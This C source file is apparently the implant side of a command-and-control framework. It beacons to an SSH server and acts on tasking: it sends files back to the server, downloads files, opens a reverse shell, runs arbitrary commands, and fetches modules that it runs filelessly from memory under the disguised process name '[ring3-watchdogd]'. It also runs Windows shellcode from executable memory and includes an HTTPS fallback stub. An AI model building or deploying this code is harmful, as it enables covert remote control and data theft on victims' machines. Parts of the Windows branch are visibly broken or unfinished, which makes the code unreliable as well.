#include "agent.h"
#include "config.h"
#include "b64.h"
#include "beacon.h"
#include "shell.h"

// Agent in-memory execution definitions
#ifdef _WIN32
#define strncasecmp _strnicmp
int exec_module(ssh_session session, char *module){
	ULONG32 payload_size;
    char * alloc_mem_ptr;
    int i;
    void (*func_ptr)();
    
    // Tests connection
    //int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
    
    //if (sock_count != 4 || payload_size <= 0) 
      //  cleanup_sockets(remote_sock);
    
    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (alloc_mem_ptr == NULL) 
        return -1;
        
    alloc_mem_ptr[0] = 0xBF;
    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);

	int rc=0;
    int count=0;
    void * startb = alloc_mem_ptr + 5;
    while (count < payload_size) {
        //rc = recv(sock, (char *)startb, size_of - count, 0);
        startb += rc; 
        count += rc;
        if (rc == SOCKET_ERROR) 
            return -1;
    }

    func_ptr = (void (*)())alloc_mem_ptr;
    func_ptr();
}
#include <winsock.h>
#else
#define _GNU_SOURCE
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/wait.h>
#include <sys/types.h>

int do_exec(char *buff, int size){
	/* Helper function for executing a buffer in RAM
	 * Returns the process exit code or -1 on error
	 */
	pid_t child;
	int p_id;
	int status = 0;
	int fd;
    char *p;
 
    p_id=getpid();  /*process id*/
     
    printf("Current process ID: %d\n",p_id);
    
// Create anon FD
    fd = memfd_create("", 1U); // MFD_CLOEXEC
    write(fd, buff, size);
    asprintf(&p, "/proc/%d/fd/%i", p_id, fd);
    
// fork to background
	child = fork();
    if (child == 0)
    {

		// So here might be a problem

		// A call to this function from a process with more than one 
		// thread results in all threads being terminated and the new 
		// executable image being loaded and executed. No destructor 
		// functions are called. 

		// The good news is that it might only apply to the calling
		// process, and so if we call it from a thread there wont be 
		// any closed threads?
        execlp(p, "[ring3-watchdogd]", NULL);
        perror("execution error");
        exit(-1);
	}
	
    else if (child == -1)
    {
        perror("fork");
        exit(-1);
    }

// Wait and exit
	waitpid(child, &status, 0);
	if ( WIFEXITED(status) ) 
    { 
        int exit_status = WEXITSTATUS(status);         
		printf("Exit status of the child was %d\n", exit_status); 
		return exit_status;
    } 
	return -1;
}

int exec_module(ssh_channel channel, char *module){
	int rc = 0;
	int nbytes = 0;
	int exit_status = 0;
	int size = 0;
	int finSize = 0;
	char *buff;
	char *ptrFin;
	char buffr[BUFSIZ];
	
	memset(buffr, 0, sizeof(buffr));
	sprintf(buffr, "14|%s", module);
	
	printf("Downloading module...\n");
	
	// write module name to server
	rc = ssh_channel_write(channel, buffr, strlen(buffr));
	if (rc == SSH_ERROR)
  	{
		printf("Write to channel failed\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}
	
	// get encoded size of file
	memset(buffr, 0, sizeof(buffr));
	nbytes = ssh_channel_read(channel, buffr, sizeof(buffr), 0);
	if (nbytes < 0){
		printf("Caught read error from server...\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}	

	rc = ssh_channel_write(channel, "ok", 3);
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
	}

	// convert size to integer and allocate memory
	size = atoi(buffr);
	printf("%s, %d\n", buffr, size);

	buff = malloc(size+1);
	memset(buff, 0, size+1);

	// read file from channel and decode
	rc = ssh_channel_read(channel, buff, size, 0);
	
	finSize = b64_decoded_size(buff);
	ptrFin = malloc(finSize+1);
	memset(ptrFin, 0, finSize+1);

	
	if(!b64_decode(buff, (unsigned char *)ptrFin, finSize)){
		printf("Decode failure\n");
		return SSH_ERROR;
	}

	free(buff);

	// execute file from memory
	exit_status = do_exec(ptrFin, size);
	memset(buffr, 0, sizeof(buffr));
	sprintf(buffr, "%d", exit_status);

	ssh_channel_write(channel, buffr, 2);
	//free(ptrFin);
	return 0;
}
#endif






struct tasking_struct{
	int operation;
	char *opts;
};

int func_loop(ssh_session session)
{
	/* Primary function loop */
	// Initialize vars
  	ssh_channel channel;
	int rc;
	char tmp[3];
	char *beacon = NULL;;
	char tasking[2048];
	int nbytes;

	memset(tasking, 0, sizeof(tasking));
	channel = ssh_channel_new(session);

	printf("[+] Created new SSH channel\n");
  	if (channel == NULL)
    	return SSH_ERROR;

	// Open channel
  	rc = ssh_channel_open_session(channel);
	printf("[+] Opened SSH Channel with remote server\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(channel);
    	return rc;
  	}

	// Request a shell interface
  	rc = ssh_channel_request_shell(channel);
	
	printf("[ ] Sent request for shell\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return rc;
  	}
	printf("[+] Made it through check\n");

	// Begin the meat of the stuff


	// Send the global ID

	printf("Identified as an agent\n");
	rc = ssh_channel_write(channel, "1", 2);
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_free(channel);
    	return rc;
	}

	rc = ssh_channel_read(channel, tmp, 3, 0);
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_free(channel);
    	return rc;
	}

	beacon = get_beacon();
	
	rc = ssh_channel_write(channel, beacon, strlen(beacon));
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_free(channel);
    	return rc;
	}

	printf("Waiting for read...\n");

	// TODO: Make this a loop until AGENT_TERM is reached
	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
	printf("read %d bytes from channel\n", nbytes);
	if (nbytes < 0){
		printf("Caught read error from server...\n");
    	ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}	

	printf("Read data: %s\n", tasking);
	parse_tasking(tasking, channel);
	
	  // close connections
	rc = ssh_channel_write(channel, "00|", 4);
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
    	ssh_channel_free(channel);
    	return SSH_ERROR;
	}

	rc = ssh_channel_close(channel);
	if (rc == SSH_ERROR){
		printf("Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_free(channel);
    	return rc;
	}  

	ssh_channel_free(channel);
	  
  	return SSH_OK;
}

int misc_get_file(char *name, char **ptr){
    int size = 0;
    FILE *file = NULL;
    file = fopen(name, "rb");

    if (file == NULL)
    {
        printf("Failed to open file %s\n", name);
        return -1;
    }
    fseek(file, 0L, SEEK_END);
    size = ftell(file);

    *ptr = malloc(size);
    memset(*ptr, 0, size);
    rewind(file);
    fread(*ptr, 1, size, file);
    fclose(file);

    return size;
}

int misc_index_of(char* str, char find, int rev){
    if (rev)
    {
        int end = strlen(str);
        int ctr = 0;
        while(end - ctr > 0){
            if(str[end-ctr] == find){
                return end - ctr;
            }
            ctr++;
        }
        return -1;
    } else {
        int i = 0;

        while (str[i] != '\0')
        {
            if (str[i] == find)
            {
                return i;
            }

            i++;
        }

        return -1;
    }
}

int upload_file(ssh_channel chan, char *path){
	char buff[BUFSIZ];
    char directory[BUFSIZ];
    char tmpbuffer[8];
    char *file_data;
    char *enc_data;
    int size = 0;
    int size_e = 0;
    int rc = 0;

	printf("Sending file -> %s\n", path);
	int offset = misc_index_of(path, '/', 1);
	
    memset(buff, 0, sizeof(buff));
    memset(directory, 0, sizeof(directory));
	memset(tmpbuffer, 0, sizeof(tmpbuffer));
	
	size = misc_get_file(path, &file_data);

	path = path + offset +1;
	sprintf(buff, "11|%s", path);
	ssh_channel_write(chan, buff, strlen(buff));
	ssh_channel_read(chan, tmpbuffer, 3, 0);
    // get filesize 
        
    if(size < 0){
        printf("Filename '%s' does not exist\n", path); 
        rc = ssh_channel_write(chan, "er", 3);
        if(rc == SSH_ERROR){
            printf("Failed to write data to channel: %s\n",  ssh_get_error(ssh_channel_get_session(chan)));
        }
        return 2;
    }
    
    size_e = b64_encoded_size(size);
    sprintf(tmpbuffer, "%d", size_e);
        
    // writes file size
    rc = ssh_channel_write(chan, tmpbuffer, sizeof(tmpbuffer));
    if(rc == SSH_ERROR){
        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }
    
    rc = ssh_channel_read(chan, buff, sizeof(buff), 0);
    if(rc == SSH_ERROR){
        printf("Failed to write data to channel: %s\n",  ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }
        
    enc_data = b64_encode((unsigned char *)file_data, size);
        
    // writes file 
    rc = ssh_channel_write(chan, enc_data, size_e);
    if(rc == SSH_ERROR){
        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }
    memset(tmpbuffer, 0, 8);
    
    rc = ssh_channel_read(chan, tmpbuffer, 8, 0);
    if(rc == SSH_ERROR){
        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }

    free(file_data);
    free(enc_data);

    return 0;
}

int download_file(ssh_channel chan, char *filename){
	int rc = 0;
    int size = 0;
    int size_e = 0;
    char *data_ptr;
    char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    FILE *file;

	memset(buff, 0, sizeof(buff));
	sprintf(buff, "10|%s", filename);
	printf("Sending message...\n");

	rc = ssh_channel_write(chan, buff, strlen(buff));
	printf("Wrote to channel\n");
    if(rc == SSH_ERROR){
        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }

    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    rc = ssh_channel_read(chan, tmpbuffer, sizeof(tmpbuffer), 0);
    if(rc == SSH_ERROR){
        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }

    size = atoi(tmpbuffer);
    data_ptr = malloc(size+1);
    memset(data_ptr, 0, size+1);
            
    // writes file size
    rc = ssh_channel_write(chan, "ok", 3);
    if(rc == SSH_ERROR){
        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }
    rc = ssh_channel_read(chan, data_ptr, size, 0);
    if(rc == SSH_ERROR){
        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }

    size_e = b64_decoded_size(data_ptr);

	enc_ptr = malloc(size_e);
	if(!b64_decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
        printf("Failed to decode data\n");
        free(data_ptr);
        free(enc_ptr);
        return 1;
    }
    free(data_ptr);
            
    // writes file 
    rc = ssh_channel_write(chan, "ok", 3);
    if(rc == SSH_ERROR){
        printf("Caught channel error: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
        return 1;
    }

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    sprintf(buff, "%s/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), filename);
	file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);
    free(enc_ptr);

    return 0;
}

int parse_tasking(char *tasking, ssh_channel chan){

	// TODO: UPDATE THIS TO NEW TASKING APPROACH
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if(!strncmp(tasking, "default", 7)){
		printf("No tasking available. Quitting...\n");
		ssh_channel_write(chan, "0", 2);
		return 0;
	}


	// get the number of instructions to complete
	int num = 0;
	char *tmp = tasking;
	char *dat = NULL;
	char tmpbf[3];

	for (; tasking[num]; tasking[num]=='\n' ? num++ : *tasking++);
	tasking = tmp;
	printf("Number of tasks to do: %d\n", num);
	struct tasking_struct *tasking_arr[num];

	char *p = strtok(tasking, "\n");
	printf("Filling the structure array\n");
	
	// Parses the data into structure array
	int i = 0;
	while(p != NULL)
	{
		// get operation int
		memset(tmpbf, 0, sizeof(tmpbf));
		strncat(tmpbf, p, 2);
		struct tasking_struct *curr = malloc(sizeof(struct tasking_struct));
		curr->operation = atoi(tmpbf);
		//tasking_arr[i].operation = atoi(tmpbf);

		// get options for operation
		dat = strdup(p+3);
		curr->opts = dat;
		tasking_arr[i] = curr;

		// clean up and move on
		p = strtok(NULL, "\n");
		//memset(tmpbf, 0, 2);
		i++;
	}

	for(int j = 0; j < num; j++){
		switch(tasking_arr[j]->operation)
		{
		case AGENT_DOWN_FILE:
			printf("Got tasking to download file %s\n", tasking_arr[j]->opts);
			download_file(chan, tasking_arr[j]->opts);
			//rc = download(tasking_arr[j].opts);
			//ssh_channel_write(chan, )
			break;
		case AGENT_REV_SHELL:
			printf("Got tasking to start reverse shell\n");
			shell_unix(chan);
			break;
		case AGENT_UP_FILE:
			printf("Got tasking to upload file %s\n", tasking_arr[j]->opts);
			upload_file(chan, tasking_arr[j]->opts);
			break;
		case AGENT_EXEC_SC:
			printf("Got tasking to execute command %s\n", tasking_arr[j]->opts);
			system(tasking_arr[j]->opts);
			break;
		case AGENT_EXEC_MODULE:
			printf("Got tasking to execute module %s\n", tasking_arr[j]->opts);
			exec_module(chan, tasking_arr[j]->opts);
			
			break;

		case AGENT_EXIT:
			printf("Got agent exit request\n");
			break;

		default:
			printf("Caught unknown tasking value: %d\n", tasking_arr[j]->operation);
			break;
		}
	
	}

	// free all stuff
	for(int k = 0; k < num; k++){
		// Something is broken in here
		//printf("Freeing shit.\nOperation: %d\nOptions: %s\n", tasking_arr[k]->operation, tasking_arr[k]->opts);
		if(tasking_arr[k] == NULL) continue;
		if(tasking_arr[k]->opts != NULL) free(tasking_arr[k]->opts);
		free(tasking_arr[k]);
		//if(tasking_arr[k]->operation != NULL) free(tasking_arr[k]);
	}
	printf("Finished freeing shit\n");
	return 0;
}

void get_tasking_https(){
	// Test thing for HTTPS C2 infrastructure, in case of SSH being blocked/filtered
	CURL *curl;
  	CURLcode res;

  	curl_global_init(CURL_GLOBAL_DEFAULT);

  	curl = curl_easy_init();
  	if(curl) {
    	curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");

#ifdef SKIP_PEER_VERIFICATION
    /*
     * If you want to connect to a site who isn't using a certificate that is
     * signed by one of the certs in the CA bundle you have, you can skip the
     * verification of the server's certificate. This makes the connection
     * A LOT LESS SECURE.
     *
     * If you have a CA cert for the server stored someplace else than in the
     * default bundle, then the CURLOPT_CAPATH option might come handy for
     * you.
     */
    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
#endif

#ifdef SKIP_HOSTNAME_VERIFICATION
    /*
     * If the site you're connecting to uses a different host name that what
     * they have mentioned in their server certificate's commonName (or
     * subjectAltName) fields, libcurl will refuse to connect. You can skip
     * this check, but this will make the connection less secure.
     */
    	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif

    	/* Perform the request, res will get the return code */
    	res = curl_easy_perform(curl);
    	/* Check for errors */
    	if(res != CURLE_OK)
      		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

    	/* always cleanup */
    	curl_easy_cleanup(curl);
  	}

  	curl_global_cleanup();
}